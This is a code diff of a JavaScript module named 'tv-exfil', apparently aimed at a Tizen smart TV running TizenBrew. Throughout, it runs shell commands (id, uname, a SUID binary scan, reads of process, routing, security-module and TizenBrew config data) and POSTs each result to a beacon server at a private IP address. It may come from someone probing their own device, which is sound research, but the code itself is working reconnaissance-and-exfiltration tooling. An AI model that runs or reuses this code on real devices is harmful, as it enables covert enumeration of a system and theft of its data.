@@ -1,62 +1,65 @@
-const fetch = require('node-fetch');
-const BEACON_URL = 'http://192.168.0.73:8008/tv-results';
+var http = require('http');
+var BEACON_HOST = '192.168.0.73';
+var BEACON_PORT = 8008;
 
 function beacon(obj) {
-    fetch(BEACON_URL, {
+    var data = JSON.stringify(obj);
+    var req = http.request({
+        hostname: BEACON_HOST,
+        port: BEACON_PORT,
+        path: '/tv-results',
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(obj)
-    }).catch(function(e) { console.log('beacon fail: ' + e.message); });
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': Buffer.byteLength(data)
+        }
+    });
+    req.on('error', function(e) { console.log('beacon error: ' + e.message); });
+    req.write(data);
+    req.end();
 }
 
 // Step 1: confirm module loaded
-beacon({source: "tv-exfil-d", step: 1, msg: "module loaded", ts: new Date().toISOString()});
+beacon({source: "tv-exfil", step: 1, msg: "module loaded", ts: new Date().toISOString()});
 
 async function main() {
     try {
-        // Step 2: test child_process
         var cp;
         try {
             cp = require('child_process');
-            beacon({source: "tv-exfil-d", step: 2, msg: "child_process available", ts: new Date().toISOString()});
+            beacon({source: "tv-exfil", step: 2, msg: "child_process OK", ts: new Date().toISOString()});
         } catch(e) {
-            beacon({source: "tv-exfil-d", step: 2, msg: "child_process BLOCKED: " + e.message, ts: new Date().toISOString()});
+            beacon({source: "tv-exfil", step: 2, msg: "child_process BLOCKED: " + e.message, ts: new Date().toISOString()});
             return;
         }
 
         var run = function(cmd, timeout) {
             return new Promise(function(resolve) {
                 cp.exec(cmd, {timeout: timeout || 8000}, function(err, stdout, stderr) {
-                    resolve({cmd: cmd, err: err ? err.message : null, out: stdout ? stdout.substring(0, 2000) : '', err_out: stderr ? stderr.substring(0, 500) : ''});
+                    resolve({cmd: cmd, err: err ? err.message : null, out: stdout ? stdout.substring(0, 3000) : '', err_out: stderr ? stderr.substring(0, 500) : ''});
                 });
             });
         };
 
-        var results = {source: "tv-exfil-d", ts: new Date().toISOString(), cmds: []};
+        var results = {source: "tv-exfil", ts: new Date().toISOString(), cmds: []};
 
-        // Step 3: basic commands
         results.cmds.push(await run('id'));
-        beacon({source: "tv-exfil-d", step: 3, msg: "id done", data: results.cmds[results.cmds.length-1], ts: new Date().toISOString()});
+        beacon({source: "tv-exfil", step: 3, msg: "id", data: results.cmds[0], ts: new Date().toISOString()});
 
         results.cmds.push(await run('uname -a'));
-        beacon({source: "tv-exfil-d", step: 4, msg: "uname done", data: results.cmds[results.cmds.length-1], ts: new Date().toISOString()});
+        beacon({source: "tv-exfil", step: 4, msg: "uname", data: results.cmds[1], ts: new Date().toISOString()});
 
-        // Step 5: SUID scan (slow)
         results.cmds.push(await run('find / -perm -4000 -type f 2>/dev/null', 15000));
-        beacon({source: "tv-exfil-d", step: 5, msg: "suid done", data: results.cmds[results.cmds.length-1], ts: new Date().toISOString()});
+        beacon({source: "tv-exfil", step: 5, msg: "suid", data: results.cmds[2], ts: new Date().toISOString()});
 
-        // Step 6: SMACK + processes + network
         results.cmds.push(await run('cat /proc/security/lsm 2>/dev/null; ls /sys/fs/ 2>/dev/null'));
         results.cmds.push(await run('ps 2>/dev/null | head -40'));
-        results.cmds.push(await run('cat /proc/net/route 2>/dev/null; cat /etc/resolv.conf 2>/dev/null'));
-
-        // Step 7: TizenBrew config
+        results.cmds.push(await run('cat /proc/net/route 2>/dev/null'));
         results.cmds.push(await run('cat /home/owner/share/.tizenbrewConfig.json 2>/dev/null'));
 
-        // Step 8: final beacon with all results
-        beacon({source: "tv-exfil-d", step: 8, msg: "ALL DATA", data: results, ts: new Date().toISOString()});
+        beacon({source: "tv-exfil", step: 9, msg: "ALL", data: results, ts: new Date().toISOString()});
     } catch(e) {
-        beacon({source: "tv-exfil-d", step: "ERR", msg: e.message, stack: e.stack, ts: new Date().toISOString()});
+        beacon({source: "tv-exfil", step: "ERR", msg: e.message, ts: new Date().toISOString()});
     }
 }
 
